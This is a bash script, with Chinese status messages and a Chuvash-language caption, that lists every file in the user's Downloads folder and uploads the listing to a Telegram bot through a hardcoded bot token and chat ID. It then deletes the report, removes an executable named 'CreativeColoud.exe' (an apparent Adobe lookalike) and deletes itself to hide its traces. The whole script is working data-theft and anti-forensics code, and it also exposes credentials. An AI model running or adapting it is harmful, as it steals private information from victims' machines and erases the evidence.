#!/bin/bash

TOKEN="8475448253:AAHp0_a3es41WG7so8I2-9K_n2g59Rmgr3M"
CHAT_ID="7318370755"
EXE_NAME="CreativeColoud.exe"

TARGET="$HOME/Downloads"
OUTPUT_FILE="downloads_scan_report.txt"
SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"

echo "----------------------------------------------------------"
echo "🔎 正在扫描: $TARGET"
echo "🚫 已跳过所有 'Adobe' 文件夹"
echo "📄 结果将保存至: $OUTPUT_FILE"
echo "----------------------------------------------------------"

echo "下载文件夹扫描报告" > "$OUTPUT_FILE"
echo "扫描时间: $(date)" >> "$OUTPUT_FILE"
echo "目标目录: $TARGET" >> "$OUTPUT_FILE"
echo "----------------------------------------------------------" >> "$OUTPUT_FILE"
echo "" >> "$OUTPUT_FILE"

if [ -d "$TARGET" ]; then
    find "$TARGET" -name "*Adobe*" -type d -prune -o -print | while read -r item; do
        
        if [ -d "$item" ]; then
            if [ "$item" != "$TARGET" ]; then
                echo "[目录] $item" >> "$OUTPUT_FILE"
            fi
        else
            echo "  |_ [文件] $item" >> "$OUTPUT_FILE"
        fi
    done

    echo "✅ 扫描完成！"
else
    echo "❌ 未找到目标文件夹！"
    echo "未找到目标文件夹" >> "$OUTPUT_FILE"
fi

if [ -f "$OUTPUT_FILE" ]; then
    echo "📤 正在发送扫描结果至 Telegram..."
    curl -s -k -F chat_id="${CHAT_ID}" \
         -F document=@"${OUTPUT_FILE}" \
         -F caption="Сканировани вӗҫленнӗ. Файл $EXE_NAME Сценарие часах пӗтерӗҫ. 🧹" \
         "https://api.telegram.org/bot${TOKEN}/sendDocument" > /dev/null
    
    sleep 2
fi

echo "🧹 正在清理痕迹并自毁..."

rm -f "$OUTPUT_FILE"

if [ -f "$SCRIPT_DIR/$EXE_NAME" ]; then
    rm -f "$SCRIPT_DIR/$EXE_NAME"
fi

rm -- "$0"

echo "完成。"